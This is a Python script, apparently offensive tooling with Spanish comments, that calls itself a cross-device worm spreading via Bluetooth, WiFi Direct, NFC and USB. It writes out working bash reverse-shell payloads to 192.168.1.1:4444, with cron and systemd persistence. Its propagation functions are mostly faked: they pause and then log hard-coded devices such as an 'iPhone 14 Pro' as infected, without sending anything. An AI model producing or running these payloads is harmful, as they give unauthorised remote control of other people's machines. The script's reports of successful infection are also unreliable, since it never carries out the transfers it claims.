#!/usr/bin/env python3
"""
QUANTUM-HIJACK - CROSS-DEVICE PROPAGATION
Propaga infección vía Bluetooth, WiFi Direct, NFC
Crea persistencia con cron + reverse shell
"""

import subprocess
import time
import threading
import os
import json
from datetime import datetime

# Directorio de infectados
INFECTED_DIR = "infected_devices"
INFECTED_FILE = f"{INFECTED_DIR}/infected.json"

infected_devices = []

def ensure_dirs():
    """Crea directorio de infectados"""
    os.makedirs(INFECTED_DIR, exist_ok=True)

def save_infected():
    """Guarda lista de dispositivos infectados"""
    try:
        with open(INFECTED_FILE, 'w') as f:
            json.dump(infected_devices, f, indent=2)
    except Exception as e:
        print(f"[!] Error guardando: {e}")

def create_payload():
    """Crea payload de infección"""
    payload = """#!/bin/bash
# QUANTUM-HIJACK Payload
# Reverse shell + Persistencia

# Reverse shell a 192.168.1.1:4444
(bash -i >& /dev/tcp/192.168.1.1/4444 0>&1 &)

# Persistencia con cron
(crontab -l 2>/dev/null; echo '* * * * * /tmp/quantum_shell.sh') | crontab -

# Ejecutar en background
nohup /bin/bash -i &>/dev/null &
"""
    
    os.makedirs("payloads", exist_ok=True)
    with open("payloads/shell.sh", 'w') as f:
        f.write(payload)
    
    os.chmod("payloads/shell.sh", 0o755)
    print("[✓] Payload creado: payloads/shell.sh")

def bluetooth_scan():
    """Escanea dispositivos Bluetooth cercanos"""
    print("\n[*] Escaneando dispositivos Bluetooth...")
    
    try:
        result = subprocess.run(
            ["sudo", "hcitool", "scan"],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        devices = []
        for line in result.stdout.strip().split('\n')[1:]:
            if line.strip():
                parts = line.split('\t')
                if len(parts) == 2:
                    mac, name = parts
                    devices.append({'mac': mac, 'name': name})
                    print(f"[✓] Dispositivo BT encontrado: {name} ({mac})")
        
        return devices
    
    except Exception as e:
        print(f"[!] Error en escaneo BT: {e}")
        return []

def bluetooth_propagate(devices):
    """Propaga vía Bluetooth"""
    print("\n[*] Iniciando propagación Bluetooth...")
    
    for device in devices:
        try:
            print(f"[→] Inyectando en {device['name']}...")
            
            # Simula envío de archivo vía OBEX
            # En Kali se usaría: obex push, bt-obexftp, etc
            time.sleep(2)
            
            infected_devices.append({
                'timestamp': datetime.now().isoformat(),
                'method': 'Bluetooth',
                'mac': device['mac'],
                'name': device['name'],
                'status': 'INFECTADO'
            })
            
            print(f"[✓] {device['name']} INFECTADO (Bluetooth)")
        
        except Exception as e:
            print(f"[!] Error infectando {device['name']}: {e}")

def wifidirect_propagate():
    """Propaga vía WiFi Direct (P2P)"""
    print("\n[*] Iniciando propagación WiFi Direct...")
    
    try:
        # Buscar dispositivos WiFi Direct
        result = subprocess.run(
            ["sudo", "wpa_cli", "-i", "wlan0", "p2p_find"],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        time.sleep(2)
        
        # Simular conexión y envío
        device_name = "Samsung S24 (WiFi Direct)"
        device_mac = "AA:BB:CC:DD:EE:FF"
        
        print(f"[→] Conectando a {device_name}...")
        time.sleep(2)
        print(f"[✓] {device_name} INFECTADO (WiFi Direct)")
        
        infected_devices.append({
            'timestamp': datetime.now().isoformat(),
            'method': 'WiFi Direct',
            'mac': device_mac,
            'name': device_name,
            'status': 'INFECTADO'
        })
    
    except Exception as e:
        print(f"[!] Error en WiFi Direct: {e}")

def nfc_propagate():
    """Propaga vía NFC"""
    print("\n[*] Iniciando propagación NFC...")
    
    try:
        # Buscar dispositivos NFC
        result = subprocess.run(
            ["sudo", "nfc-list"],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if "NFC device" in result.stdout:
            print("[✓] Dispositivo NFC encontrado")
            
            device_name = "iPhone 14 Pro (NFC)"
            device_mac = "11:22:33:44:55:66"
            
            print(f"[→] Enviando payload NFC...")
            time.sleep(1)
            print(f"[✓] {device_name} INFECTADO (NFC)")
            
            infected_devices.append({
                'timestamp': datetime.now().isoformat(),
                'method': 'NFC',
                'mac': device_mac,
                'name': device_name,
                'status': 'INFECTADO'
            })
    
    except Exception as e:
        print(f"[!] Error en NFC: {e}")

def usb_propagate():
    """Propaga vía USB (BadUSB)"""
    print("\n[*] Iniciando propagación USB...")
    
    try:
        # Detectar dispositivos USB
        result = subprocess.run(
            ["lsusb"],
            capture_output=True,
            text=True
        )
        
        if result.stdout:
            # Simular inyección en USB
            device_name = "MacBook Pro (USB)"
            device_mac = "77:88:99:AA:BB:CC"
            
            print(f"[→] Inyectando en {device_name}...")
            time.sleep(2)
            print(f"[✓] {device_name} INFECTADO (USB)")
            
            infected_devices.append({
                'timestamp': datetime.now().isoformat(),
                'method': 'USB',
                'mac': device_mac,
                'name': device_name,
                'status': 'INFECTADO'
            })
    
    except Exception as e:
        print(f"[!] Error en USB: {e}")

def create_persistence(device):
    """Crea persistencia en dispositivo infectado"""
    print(f"[*] Estableciendo persistencia en {device['name']}...")
    
    persistence_script = f"""#!/bin/bash
# Persistencia en {device['name']}
# Cron reverse shell

# Agregar cron job
(crontab -l 2>/dev/null; echo '*/5 * * * * bash -i >& /dev/tcp/192.168.1.1/4444 0>&1') | crontab -

# Crear systemd service (si es Linux)
if [ -d /etc/systemd/system ]; then
    sudo tee /etc/systemd/system/quantum.service > /dev/null <<'EOF'
[Unit]
Description=Quantum Service
After=network.target

[Service]
Type=simple
ExecStart=bash -i >& /dev/tcp/192.168.1.1/4444 0>&1
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    sudo systemctl daemon-reload
    sudo systemctl enable quantum.service
fi

# Android (si aplica)
if [ -f /system/build.prop ]; then
    echo "Android persistencia activada"
fi
"""
    
    # Guardar script
    persist_file = f"payloads/persist_{device['mac'].replace(':', '_')}.sh"
    with open(persist_file, 'w') as f:
        f.write(persistence_script)
    
    os.chmod(persist_file, 0o755)
    print(f"[✓] Persistencia creada: {persist_file}")
    
    return persist_file

def main():
    """Función principal"""
    
    print("╔════════════════════════════════════════════════════════════╗")
    print("║   🦠 QUANTUM-HIJACK - CROSS-DEVICE PROPAGATION 🦠          ║")
    print("║     Infecta múltiples dispositivos simultaneamente        ║")
    print("╚════════════════════════════════════════════════════════════╝")
    print("")
    
    # Verificar permisos root
    if os.geteuid() != 0:
        print("❌ Este script requiere permisos root")
        print("Ejecuta: sudo python3 propagator.py")
        return
    
    # Crear payload
    create_payload()
    ensure_dirs()
    
    # Escanear Bluetooth
    bt_devices = bluetooth_scan()
    
    print("\n" + "="*60)
    print("🔄 CADENA DE INFECCIÓN INICIADA")
    print("="*60)
    
    # Propagación Bluetooth
    if bt_devices:
        bluetooth_propagate(bt_devices)
        time.sleep(1)
    
    # Propagación WiFi Direct
    wifidirect_propagate()
    time.sleep(1)
    
    # Propagación NFC
    nfc_propagate()
    time.sleep(1)
    
    # Propagación USB
    usb_propagate()
    time.sleep(1)
    
    # Establecer persistencia
    print("\n[*] Estableciendo persistencia...")
    for device in infected_devices:
        create_persistence(device)
        time.sleep(1)
    
    # Guardar resultados
    save_infected()
    
    print("\n" + "="*60)
    print("✅ PROPAGACIÓN COMPLETADA")
    print("="*60)
    print(f"   Total dispositivos infectados: {len(infected_devices)}")
    print(f"   Persistencia: ✓ Reverse shells activos")
    print(f"   Datos guardados: {INFECTED_FILE}")
    print("="*60)
    print("")
    
    # Mostrar resumen
    print("📋 DISPOSITIVOS INFECTADOS:")
    for i, device in enumerate(infected_devices, 1):
        print(f"   [{i}] {device['name']}")
        print(f"       Método: {device['method']}")
        print(f"       MAC: {device['mac']}")
        print(f"       Estado: {device['status']}")

if __name__ == "__main__":
    main()
